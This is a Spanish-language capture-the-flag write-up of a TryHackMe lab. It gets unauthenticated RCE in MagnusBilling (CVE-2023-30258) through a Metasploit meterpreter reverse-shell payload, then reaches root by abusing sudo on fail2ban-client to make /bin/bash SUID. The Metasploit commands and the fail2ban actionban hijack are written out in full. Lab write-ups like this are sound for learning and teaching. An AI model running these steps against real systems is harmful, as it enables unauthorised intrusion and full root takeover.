# THM-MagnusBilling-RCE-to-Fail2Ban-LPE.
RCE en MagnusBilling v7.3.0 (Unauth) - Enumeración de servicios VoIP (Asterisk/AMI) con captura de credenciales y Secuestro de la lógica de baneo de Fail2Ban para activar el bit SUID en /bin/bash


**Nmap**
```bash
nmap -p- -sV -sC -sS --open --min-rate 5000 10.81.152.90 -n -Pn -oN billin_scan.txt
```
```​
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 0c:7a:4f:48:e3:24:c1:f7:e1:bb:49:8f:7c:2f:76:3e (ECDSA)
|_  256 5b:21:e7:00:cb:25:a4:ae:c9:72:15:ab:99:0b:01:58 (ED25519)
80/tcp   open  http     Apache httpd 2.4.62 ((Debian))
| http-title:             MagnusBilling        
|_Requested resource was http://10.81.152.90/mbilling/
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
|_http-server-header: Apache/2.4.62 (Debian)
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
​

**Análisis de nmap**
<br>
<br>
```22 (SSH)```
OpenSSH 9.2p1: Versión muy reciente y parcheada. Salvo por credenciales débiles (fuerza bruta), es un vector difícil de atacar inicialmente.
<br>
<br>
```80 (HTTP)```
Apache 2.4.62: MagnusBilling. Los CMS y paneles de gestión son siempre el eslabón más débil debido a su gran superficie de código expuesto.
<br>
<br>
```3306 (MySQL)```
MariaDB: Base de datos que almacena facturación y usuarios. Útil una vez dentro (Post-explotación) o para inyección SQL.
```5038 (Asterisk)```
<br>
<br>
Asterisk Manager: El "corazón" de la telefonía. Permite control de llamadas. Muy peligroso si se encuentran credenciales en el panel web.
<br>
<br>
```Whatweb```
```http://10.81.152.90/mbilling [301 Moved Permanently] Apache[2.4.62], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[10.81.152.90], RedirectLocation[http://10.81.152.90/mbilling/], Title[301 Moved Permanently]```
<br>
​
```Gobuster```
```gobuster dir -u http://10.81.152.90  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html.txt,bak```
<br>
<img width="577" height="84" alt="gobuster 1" src="https://github.com/user-attachments/assets/4ce609c3-5dd9-42d1-afd0-e309b18ff375" />
<br>    ​
<br>
<img width="798" height="363" alt="panel" src="https://github.com/user-attachments/assets/8b3f4e26-9bd2-4d18-a539-3bc84875df72" />
<br>

```gobuster dir -u http://10.81.152.90/mbilling/  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html.txt,bak```
<br>
<img width="788" height="169" alt="go2" src="https://github.com/user-attachments/assets/345093ab-e419-4be2-b50f-9472053cae8e" />
<br>​

Dentro de todos estos directorios no me da nada intertesante asique voy a ver que tipo de vuilnerabilidad me esconde esta pagina en la que se aloja dentro del puerto 80
searchsploit
```searchsploit MagnusBilling```
<br>​
<img width="934" height="80" alt="MAGNUSBILLING" src="https://github.com/user-attachments/assets/b4deab84-e20d-4534-b95f-6addf03047a3" />
<br>

Casualmente solo me aparece un tipo de vulnerabilidad asique vale la pena probarlo en Metasploit
Vemos que ademas El exploit aprovecha una vulnerabilidad en el manejo de archivos/parámetros en el portal de MagnusBilling que permite inyectar código PHP malicioso.

##Ejecución del Exploit (Metasploit)##
```bash
use  linux/http/magnusbilling_unauth_rce_cve_2023_30258.
set payload php/meterpreter/reverse_tcp
set TARGETURI /mbilling
set LHOST xxx.xxx.xxx.xxx
set RHOST xxx.xxx.xxx.xxx
run
```
​
El resultado: Una sesión de Meterpreter que nos permite interactuar con el sistema de archivos del servidor.

###¿Por qué atacamos MagnusBilling primero?###
 MagnusBilling es una aplicación web. A diferencia de SSH o MariaDB, las aplicaciones web procesan entradas del usuario constantemente (parámetros, logins, formularios), lo que aumenta las probabilidades de encontrar fallos de sanitización.
 
El puerto 80 nos redirigió a /mbilling/. Al investigar este software, descubrimos el CVE-2023-30258, un fallo de inyección de comandos que permite a un atacante no autenticado (sin contraseña) ejecutar código en el servidor.

Al comprometer el servicio web, obtenemos la identidad www-data. Aunque es un usuario limitado, nos da "un pie dentro" para explorar el sistema internamente, algo que no podíamos hacer desde SSH.

Dentro de Metasploit vemos que somos el user asterisk asique lo primero que haremos es ver si podemos abusar del privilegio sudo
```bash
sudo -l
```
<br>
<img width="691" height="207" alt="client" src="https://github.com/user-attachments/assets/2d44b3a3-e350-4d87-a87a-a275cdb487f9" />
<br>​

###¿Qué es fail2ban-client?###
Es la herramienta de administración para Fail2Ban, un servicio de seguridad que monitorea los logs del sistema (como el de SSH) y banea IPs que intentan hacer fuerza bruta.
Para funcionar, fail2ban necesita interactuar con el firewall (iptables o nftables) y con los archivos de configuración del sistema.
Por eso, el cliente tiene la capacidad de arrancar/parar servicios y, lo más importante, de cambiar configuraciones de ejecución.

Primero mira qué servicios está protegiendo Fail2Ban:
```bash
sudo /usr/bin/fail2ban-client status
```
<br>​
<img width="1086" height="81" alt="jail" src="https://github.com/user-attachments/assets/69c7fdf4-fbed-4e68-a9fb-287e692e42d3" />
<br>
Como ya sabíamos que podíamos ejecutar fail2ban-client como root (por el sudo -l), necesitábamos saber dónde podíamos inyectar nuestro comando. Fail2Ban no es un bloque sólido; funciona mediante "Jails" (cárceles), que son reglas específicas para diferentes servicios.

###¿Qué es lo que nos dice este resultado?###

El servicio está activo: Si el comando responde, significa que el demonio de Fail2Ban está corriendo y podemos interactuar con él.
Identificación de vectores (Jail list): Nos da el nombre exacto de las "cárceles" activas. Esto es como ver una lista de puertas. Cada nombre (sshd, mbilling_login, etc.) es un servicio que Fail2Ban está vigilando.
Elegimos sshd de esa lista porque es el servicio más fácil de "atacar" desde fuera para forzar un baneo y disparar nuestra carga útil (payload).
```bash
sudo /usr/bin/fail2ban-client get sshd actions
```
​
Este comando es el paso de reconocimiento interno definitivo. Sin la información que te dio este comando, el exploit habría fallado porque habrías estado disparando a ciegas.
<br>
<img width="395" height="43" alt="multiport" src="https://github.com/user-attachments/assets/bcd1fe0a-fa2d-4e42-a0d9-4930e550e29f" />
<br>

###¿Qué es lo que nos ha dicho el resultado?###
Nos ha respondido: iptables-multiport.
Esto es fundamental porque Fail2Ban no tiene una única forma de banear. Puede enviarte un email, puede bloquearte en un firewall diferente o puede usar el comando iptables. En este sistema, la acción configurada se llama específicamente iptables-multiport.
¿Por qué es esto importante? Porque para cambiar el comportamiento del baneo (el comando set), necesitas indicarle el nombre exacto de la acción que quieres "secuestrar". Si hubieras intentado cambiar una acción que no existe, el sistema te habría dado un error de comando inválido.
¿Por qué nos ha funcionado?
Funciona por un concepto llamado Introspección de Configuración:
Visibilidad total: El comando get te permite ver las "tripas" de la configuración de seguridad del sistema.
Al saber que la acción es iptables-multiport, ahora ya puedes construir siguiente comando de ataque:

```bash
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "chmod +s /bin/bash"
```
​
<br>


Fail2Ban está diseñado para ejecutar comandos del sistema como root. Nosotros simplemente hemos "reprogramado" qué comando debe ejecutar.


En estos momentos Fail2Ban ahora está esperando a que alguien "se porte mal" en el SSH para ejecutar tu comando
Tienes que intentar entrar por SSH con contraseñas falsas. No es para adivinar la contraseña, sino para que Fail2Ban diga: "¡Oye! Esta IP está intentando entrar a la fuerza, voy a banearla".
<br>
<img width="657" height="234" alt="ssh" src="https://github.com/user-attachments/assets/d0f19484-7440-441d-a3a3-239c1d1c92ed" />
<br>

Entonces es cuando haces el ls -l /bin/bash para ver si la "s" mágica ha aparecido.
```bash
ls -l /bin/bash
```
<br>​
<img width="556" height="60" alt="hinbash" src="https://github.com/user-attachments/assets/07772fe4-e4f7-46a8-9b70-87ea786dc5cd" />
<br>

Esa "s" significa que el bit SUID está activo. Es la confirmación de que Fail2Ban ha mordido el anzuelo y ha ejecutado tu comando como root.
Este comando es el que efectivamente abre la puerta y te entrega el control total. Aquí tienes la explicación técnica de por qué es necesario y qué significa esa -p.

<br>
<img width="468" height="197" alt="ls -la" src="https://github.com/user-attachments/assets/ab01ec60-b73c-404f-b6f8-a93b225a273d" />
<br>
###¿Por qué hacemos este comando?###
Aunque el comando anterior (chmod +s /bin/bash) tuvo éxito y convirtió a la Bash en un binario SUID, eso no te convierte en root automáticamente. El sistema de archivos ha cambiado, pero tu sesión actual de usuario sigue siendo la de asterisk.
Necesitas ejecutar esa Bash modificada para que los privilegios de root se activen en tu terminal.
Al añadir el parámetro p, le estás diciendo a la Bash: "No sueltes los privilegios de root, mantén el User ID efectivo (EUID) que te otorga el bit SUID".

###¿Qué nos dice la respuesta del sistema?###
bash2#: Fíjate que el símbolo de tu terminal ha cambiado de $ (usuario normal) a # (superusuario). En el mundo Linux, el "almohadilla" o "hashtag" es el símbolo universal de que tienes el poder total.
whoami -> root: Este es el veredicto final. El sistema operativo confirma que, para todos los efectos, ahora eres el usuario root.
Ya somos root
